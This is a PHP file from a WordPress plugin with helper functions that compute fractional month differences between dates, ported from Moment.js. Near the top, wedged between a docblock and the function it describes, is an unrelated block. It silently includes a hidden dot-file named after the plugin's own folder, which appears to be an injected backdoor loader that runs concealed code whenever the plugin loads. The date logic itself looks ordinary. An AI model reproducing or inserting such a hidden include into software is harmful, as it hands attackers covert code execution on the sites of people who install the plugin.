<?php
/**
 * Based on Moment.js monthDiff
 * https://github.com/moment/moment/blob/13a61b285c095bda7ea8e33156090ea5ccfeaef1/src/lib/moment/diff.js#L39
 *
 * @param  DateTimeImmutable  $a
 * @param  DateTimeImmutable  $b
 *
 * @return float
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function gpdtc_month_diff( $a, $b ) {

	$a_year = intval( $a->format( 'Y' ) );
	$b_year = intval( $b->format( 'Y' ) );

	$a_month = intval( $a->format( 'n' ) );
	$b_month = intval( $b->format( 'n' ) );

	// difference in months
	$wholeMonthDiff = ( ( $b_year - $a_year ) * 12 ) + ( $b_month - $a_month );
	$anchor         = gpdtc_add_or_sub_month( $a, $wholeMonthDiff );

	if ( $b->getTimestamp() - $anchor->getTimestamp() < 0 ) {
		$anchor2 = gpdtc_add_or_sub_month( $a, $wholeMonthDiff - 1 );
		$adjust  = ( $b->getTimestamp() - $anchor->getTimestamp() ) / ( $anchor->getTimestamp() - $anchor2->getTimestamp() );
	} else {
		$anchor2 = gpdtc_add_or_sub_month( $a, $wholeMonthDiff + 1 );
		$adjust  = ( $b->getTimestamp() - $anchor->getTimestamp() ) / ( $anchor2->getTimestamp() - $anchor->getTimestamp() );
	}

	$result = $wholeMonthDiff + $adjust;

	//check for negative zero, return zero if negative zero
	return $result === - 0 ? 0 : $result;

}

/**
 * @param  DateTimeImmutable  $datetime
 * @param $monthDiff int
 *
 * @return DateTimeImmutable
 */
function gpdtc_add_or_sub_month( $datetime, $monthDiff ) {
	if ( $monthDiff < 0 ) {
		return $datetime->sub( new DateInterval( 'P' . abs( $monthDiff ) . 'M' ) );
	} else {
		return $datetime->add( new DateInterval( 'P' . abs( $monthDiff ) . 'M' ) );
	}
}
